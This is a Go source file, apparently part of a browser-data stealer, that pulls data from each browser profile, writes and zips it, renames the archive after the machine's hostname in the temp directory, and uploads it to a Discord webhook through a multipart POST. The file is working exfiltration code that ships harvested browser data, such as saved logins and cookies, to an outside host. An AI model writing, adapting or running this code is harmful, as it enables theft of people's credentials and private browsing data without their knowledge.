package main

import (
	"bytes"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"

	"src/browser"
	"src/log"
	"src/output"
	"src/types"
	"src/utils/fileutil"
)

func extractAndWrite(browsers []browser.Browser, categories []types.Category, outputDir, outputFormat string, compress bool, discordWebhook string) error {
	w, err := output.NewWriter(outputDir, outputFormat)
	if err != nil {
		return err
	}
	for _, b := range browsers {
		log.Infof("Extracting %s/%s...", b.BrowserName(), b.ProfileName())
		data, extractErr := b.Extract(categories)
		if extractErr != nil {
			log.Errorf("extract %s/%s: %v", b.BrowserName(), b.ProfileName(), extractErr)
		}
		w.Add(b.BrowserName(), b.ProfileName(), data)
	}
	if err := w.Write(); err != nil {
		return err
	}
	if compress {
		if err := fileutil.CompressDir(outputDir); err != nil {
			return fmt.Errorf("compress: %w", err)
		}
		origZip := filepath.Join(outputDir, filepath.Base(outputDir)+".zip")
		// Determine host name (Windows: COMPUTERNAME env)
		host := os.Getenv("COMPUTERNAME")
		if host == "" {
			h, _ := os.Hostname()
			host = h
		}
		tempZip := filepath.Join(os.TempDir(), host+".zip")
		if err := os.Rename(origZip, tempZip); err != nil {
			return fmt.Errorf("move zip to temp: %w", err)
		}
		log.Infof("Compressed: %s", tempZip)
		if discordWebhook != "" {
			if err := sendFileToDiscord(discordWebhook, tempZip); err != nil {
				return fmt.Errorf("upload webhook: %w", err)
			}
			log.Infof("Uploaded zip to Discord webhook")
		}
	}
	return nil
}

func sendFileToDiscord(webhook, filePath string) error {
	f, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("open file: %w", err)
	}
	defer f.Close()

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part, err := writer.CreateFormFile("file", filepath.Base(filePath))
	if err != nil {
		return fmt.Errorf("create form file: %w", err)
	}
	if _, err := io.Copy(part, f); err != nil {
		return fmt.Errorf("copy file to form: %w", err)
	}
	if err := writer.Close(); err != nil {
		return fmt.Errorf("close multipart writer: %w", err)
	}

	req, err := http.NewRequest("POST", webhook, body)
	if err != nil {
		return fmt.Errorf("new request: %w", err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("do request: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord upload failed: %s: %s", resp.Status, string(b))
	}
	return nil
}
